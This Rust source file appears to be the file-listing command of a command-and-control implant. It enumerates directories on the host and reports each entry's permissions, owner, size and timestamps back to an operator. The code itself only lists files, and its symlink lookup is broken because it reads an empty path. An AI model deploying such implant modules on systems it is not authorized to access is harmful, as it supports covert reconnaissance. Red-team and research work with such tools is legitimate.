use crate::structs::{
    FileBrowser, FileBrowserArguments, FileData, FilePermission, Task,
};
use std::os::unix::fs::{MetadataExt, PermissionsExt};

pub async fn execute(task: Task) {
    let mut response = task.new_response();

    let args: FileBrowserArguments = match serde_json::from_str(&task.data.params) {
        Ok(a) => a,
        Err(_) => FileBrowserArguments {
            path: Some(task.data.params.clone()),
            file: None,
            host: None,
            file_browser: Some(false),
            depth: Some(1),
        },
    };

    let target_path = args
        .path
        .as_deref()
        .unwrap_or(".");
    let full_path = if let Some(file) = &args.file {
        if target_path.ends_with('/') {
            format!("{}{}", target_path, file)
        } else {
            format!("{}/{}", target_path, file)
        }
    } else {
        target_path.to_string()
    };

    let path = std::path::Path::new(&full_path);
    let metadata = match std::fs::metadata(path) {
        Ok(m) => m,
        Err(e) => {
            response.set_error(&format!("Failed to stat path: {}", e));
            let _ = task.job.send_responses.send(response).await;
            let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
            return;
        }
    };

    let is_file_browser = args.file_browser.unwrap_or(false);

    if metadata.is_dir() {
        let mut files = Vec::new();
        if let Ok(entries) = std::fs::read_dir(path) {
            for entry in entries.flatten() {
                if let Ok(meta) = entry.metadata() {
                    let perm = build_permission(&meta);
                    files.push(FileData {
                        is_file: meta.is_file(),
                        permissions: perm,
                        name: entry.file_name().to_string_lossy().to_string(),
                        full_name: entry.path().to_string_lossy().to_string(),
                        file_size: meta.len() as i64,
                        last_modified: meta
                            .modified()
                            .map(|t| t.duration_since(std::time::UNIX_EPOCH).unwrap_or_default().as_millis() as i64)
                            .unwrap_or(0),
                        last_access: meta
                            .accessed()
                            .map(|t| t.duration_since(std::time::UNIX_EPOCH).unwrap_or_default().as_millis() as i64)
                            .unwrap_or(0),
                    });
                }
            }
        }

        if is_file_browser {
            let perm = build_permission(&metadata);
            let parent = path.parent().map(|p| p.to_string_lossy().to_string()).unwrap_or_default();
            let name = path.file_name().map(|n| n.to_string_lossy().to_string()).unwrap_or_else(|| full_path.clone());

            response.file_browser = Some(FileBrowser {
                files,
                is_file: false,
                permissions: perm,
                filename: name,
                parent_path: parent,
                success: true,
                file_size: metadata.len() as i64,
                last_modified: metadata.modified().map(|t| t.duration_since(std::time::UNIX_EPOCH).unwrap_or_default().as_millis() as i64).unwrap_or(0),
                last_access: metadata.accessed().map(|t| t.duration_since(std::time::UNIX_EPOCH).unwrap_or_default().as_millis() as i64).unwrap_or(0),
                update_deleted: true,
                set_as_user_output: false,
            });
        } else {
            let mut output = String::new();
            for f in &files {
                let type_char = if f.is_file { "-" } else { "d" };
                output.push_str(&format!(
                    "{}{} {:>8} {}\n",
                    type_char, f.permissions.permissions, f.file_size, f.name
                ));
            }
            response.user_output = output;
        }
        response.completed = true;
    } else {
        response.user_output = format!("{} (file, {} bytes)", full_path, metadata.len());
        response.completed = true;
    }

    let _ = task.job.send_responses.send(response).await;
    let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
}

fn build_permission(meta: &std::fs::Metadata) -> FilePermission {
    let mode = meta.permissions().mode();
    let perm_string = format!(
        "{}{}{}{}{}{}{}{}{}",
        if mode & 0o400 != 0 { "r" } else { "-" },
        if mode & 0o200 != 0 { "w" } else { "-" },
        if mode & 0o100 != 0 { "x" } else { "-" },
        if mode & 0o040 != 0 { "r" } else { "-" },
        if mode & 0o020 != 0 { "w" } else { "-" },
        if mode & 0o010 != 0 { "x" } else { "-" },
        if mode & 0o004 != 0 { "r" } else { "-" },
        if mode & 0o002 != 0 { "w" } else { "-" },
        if mode & 0o001 != 0 { "x" } else { "-" },
    );

    let uid = meta.uid() as i32;
    let gid = meta.gid() as i32;
    let user = nix::unistd::User::from_uid(nix::unistd::Uid::from_raw(uid as u32))
        .ok()
        .flatten()
        .map(|u| u.name)
        .unwrap_or_else(|| uid.to_string());
    let group = nix::unistd::Group::from_gid(nix::unistd::Gid::from_raw(gid as u32))
        .ok()
        .flatten()
        .map(|g| g.name)
        .unwrap_or_else(|| gid.to_string());

    FilePermission {
        uid,
        gid,
        permissions: perm_string,
        setuid: mode & 0o4000 != 0,
        setgid: mode & 0o2000 != 0,
        sticky: mode & 0o1000 != 0,
        user,
        group,
        symlink: std::fs::read_link(std::path::Path::new(""))
            .map(|p| p.to_string_lossy().to_string())
            .unwrap_or_default(),
    }
}
